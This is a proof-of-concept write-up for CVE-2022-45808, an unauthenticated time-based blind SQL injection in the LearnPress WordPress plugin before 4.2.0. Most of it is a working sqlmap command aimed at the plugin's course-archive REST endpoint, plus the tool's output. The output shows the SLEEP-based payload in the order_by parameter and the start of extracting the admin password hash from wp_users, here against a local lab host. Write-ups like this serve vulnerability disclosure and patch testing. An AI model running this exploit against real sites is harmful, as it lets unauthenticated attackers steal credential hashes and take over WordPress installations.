# CVE-2022-45808
LearnPress Plugin &lt; 4.2.0 - Unauthenticated time-based blind SQLi

# Description
The plugin does not properly sanitise and escape the order by parameter before using it in a SQL statement, leading to a SQL injection exploitable by unauthenticated users

POC
---

```
$ python sqlmap.py -u 'http://wordpress.lan:80/wp-json/lp/v1/courses/archive-course' --data='c_search=X&order_by=ID&order=DESC&limit=10&return_type=html' --level=5 --risk=3 --dbms='MySQL ' --sql-query "select user_pass from wp_users where id = 1"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.8.2#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:42:20 /2023-08-18/

[16:42:20] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('_learn_press_session_ecdcb476a7a41733a2e77015a9cd81cf=1465cc7e87c...bc806e4a24'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: order_by (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: c_search=X&order_by=ID AND (SELECT 1471 FROM (SELECT(SLEEP(5)))VcSO)&order=DESC&limit=10&return_type=html
---
[16:42:22] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[16:42:37] [INFO] confirming MySQL
[16:42:37] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[16:42:48] [INFO] adjusting time delay to 1 second due to good response times
[16:42:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.0.30, Apache 2.4.56
back-end DBMS: MySQL >= 8.0.0
[16:42:48] [INFO] fetching SQL SELECT statement query output: 'select user_pass from wp_users where id = 1'
[16:42:48] [INFO] retrieved: 1
[16:42:50] [INFO] retrieved: $P$BTMtNrAkEBrIUt
```
